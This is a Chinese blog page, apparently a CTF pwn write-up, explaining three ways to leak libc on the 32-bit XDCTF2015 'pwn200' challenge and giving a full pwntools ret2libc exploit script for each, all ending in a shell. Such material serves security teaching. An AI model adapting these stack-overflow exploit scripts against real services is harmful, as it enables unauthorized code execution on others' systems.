@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>泄漏libc总结(1)32位 | solo</title>
+  <meta name="description" content="泄漏libc总结(1)32位复习复习泄漏libc的几种方法，我将以pwn100-pwn200的方向来说一下！ pwn200例题我们先讲pwn200(32)位的 12345678910111213141516171819202122int __cdecl main()&amp;#123;  int buf; &#x2F;&#x2F; [esp+2Ch] [ebp-6Ch]  int v2; &#x2F;&#x2F; [esp+30h] [ebp-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="泄漏libc总结(1)32位">
+<meta property="og:url" content="http://example.com/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="泄漏libc总结(1)32位复习复习泄漏libc的几种方法，我将以pwn100-pwn200的方向来说一下！ pwn200例题我们先讲pwn200(32)位的 12345678910111213141516171819202122int __cdecl main()&amp;#123;  int buf; &#x2F;&#x2F; [esp+2Ch] [ebp-6Ch]  int v2; &#x2F;&#x2F; [esp+30h] [ebp-">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-28T12:36:38.000Z">
+<meta property="article:modified_time" content="2021-11-28T12:38:52.801Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="xctf-pwn">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">独奏</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">学习成了习惯</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuctf-pwn/" rel="tag">buuctf-pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-canary/" rel="tag">pwn-canary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwntools/" rel="tag">pwntools</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xctf-pwn/" rel="tag">xctf-pwn</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/buuctf-pwn/" style="font-size: 13px;">buuctf-pwn</a> <a href="/tags/pwn-canary/" style="font-size: 13px;">pwn-canary</a> <a href="/tags/pwntools/" style="font-size: 13px;">pwntools</a> <a href="/tags/xctf-pwn/" style="font-size: 14px;">xctf-pwn</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/" class="title">泄漏libc总结(1)32位</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-28T12:36:38.000Z" itemprop="datePublished">2021-11-28</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/23/buuctf-r2t4/" class="title">buuctf-r2t4</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-23T12:51:53.000Z" itemprop="datePublished">2021-11-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/" class="title">pwn-canary的gdb调试小节</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-13T12:24:08.000Z" itemprop="datePublished">2021-11-13</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/" class="title">v4.6.0-gdb.attach问题</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-10T08:40:03.000Z" itemprop="datePublished">2021-11-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/10/xctf-welpwn/" class="title">xctf-welpwn</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-10T07:58:43.000Z" itemprop="datePublished">2021-11-10</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-泄漏libc总结-1-32位" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      泄漏libc总结(1)32位
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/" class="article-date">
+	  <time datetime="2021-11-28T12:36:38.000Z" itemprop="datePublished">2021-11-28</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/xctf-pwn/" rel="tag">xctf-pwn</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="泄漏libc总结-1-32位"><a href="#泄漏libc总结-1-32位" class="headerlink" title="泄漏libc总结(1)32位"></a>泄漏libc总结(1)32位</h1><p>复习复习泄漏libc的几种方法，我将以pwn100-pwn200的方向来说一下！</p>
+<h2 id="pwn200例题"><a href="#pwn200例题" class="headerlink" title="pwn200例题"></a>pwn200例题</h2><p>我们先讲pwn200(32)位的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="string">&#x27;cleW&#x27;</span>;</span><br><span class="line">  v2 = <span class="string">&#x27; emo&#x27;</span>;</span><br><span class="line">  v3 = <span class="string">&#x27;X ot&#x27;</span>;</span><br><span class="line">  v4 = <span class="string">&#x27;FTCD&#x27;</span>;</span><br><span class="line">  v5 = <span class="string">&#x27;5102&#x27;</span>;</span><br><span class="line">  v6 = <span class="string">&#x27;\n!~&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();			#主要看这个函数里面的</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看向这个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]  #0x6c=108</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);#溢出 <span class="number">0x100</span>=<span class="number">256</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们这个时候没发现有其他函数比如cat flag和system的函数这个时候,我们就要从got表中找到system的got表的地址和/bin/sh的地址(俗称泄漏libc rop)</p>
+<p>动态调试出他溢出到覆盖到ebp的位置,主要我这里太麻烦了就下次再说得到溢出+覆盖</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>好我们现在该怎么办当然是利用已用的函数去调用他们PLT表去把他们的got表的的输出出来那好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+p32(write_plt) + p32(main_addr)+p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面是他的传参方式:padding+ fake_ebp+p32(system)+p32(返回地址)+p32(system 的参数)</p>
+<p>我调用的是write的函数所以有:int write(int handle,void *buf,int len); 第一个参数是文件句柄,第二个是他的内容，第三个是要写入的长度(所以是0x4)</p>
+<p>方法一:</p>
+<p>这个情况是知道对方的libc,不过一般来说要不就是 16,18,20Ubuntu的libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&quot;./pwn200&quot;</span>)	</span><br><span class="line"><span class="comment">#p = remote(&quot;159.138.137.79&quot;,55989)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)		<span class="comment">#获取文件句柄</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)	<span class="comment">#本地libc的位置</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]	<span class="comment">#read在plt表的地址</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]	<span class="comment">#read在got表的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write在plt表的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write在got表的地址</span></span><br><span class="line">main_addr = <span class="number">0x080483D0</span>			<span class="comment">#main函数的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)			<span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>)) <span class="comment">#接受泄漏出的write_got表真实的地址</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#libc函数的实际地址-泄漏出来的地址=基地址</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]	<span class="comment">#libc的system的地址+基地址=system的实际地址	</span></span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()<span class="comment">#基地址+libc查找/bin/sh字符串的地址=实际地址</span></span><br><span class="line">log.success(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system) + p32(main_addr) + p32(binsh)	<span class="comment">#直接正常rop</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)			<span class="comment">#发送payload</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>方法二:</p>
+<p>我是听说DynELF这个函数来做看了好多wp都是这样这个我只能弄出代码来解释了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=remote(&#x27;111.200.241.244&#x27;,54040)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">padding=(<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>			<span class="comment">#溢出的值</span></span><br><span class="line">main_addr=<span class="number">0x080484BE</span>			<span class="comment">#main函数的地址</span></span><br><span class="line"><span class="comment">#ppp_addr=0x080485cd</span></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span>				<span class="comment">#三次pop指令的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload=padding+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">    <span class="keyword">return</span> sh.recv(<span class="number">4</span>)	<span class="comment">#接受泄漏函数的地址</span></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">sys_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)<span class="comment">#要泄漏的地址</span></span><br><span class="line">payload=padding+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span></span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sh.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>解释:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用pwntools提供的工具DynELF来泄露system在libc中的地址，利用<span class="number">3</span>次pop(有现成的代码)和ret调用read函数把(<span class="string">&quot;/bin/sh&quot;</span>)读取到bss段上，再构造ROP链执行system(<span class="string">&quot;/bin/sh&quot;</span>)从而getshell。</span><br></pre></td></tr></table></figure>
+
+<p>方法三:</p>
+<p>就是利用一个工具去泄漏libc:LibcSearcher好像就是为了打远程而生的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p= process(&quot;./pwn200&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">49726</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_leak)</span><br><span class="line">libc_base = write_leak - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总结:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造shellcode 的方式是 padding+ fake_ebp+p32(system)+p32(返回地址)+p32(system 的参数)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2021/11/28/%E6%B3%84%E6%BC%8Flibc%E6%80%BB%E7%BB%93-1-32%E4%BD%8D/" title="泄漏libc总结(1)32位" target="_blank" rel="external">http://example.com/2021/11/28/泄漏libc总结-1-32位/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">独奏</span><small class="ml-1x">学习成了习惯</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
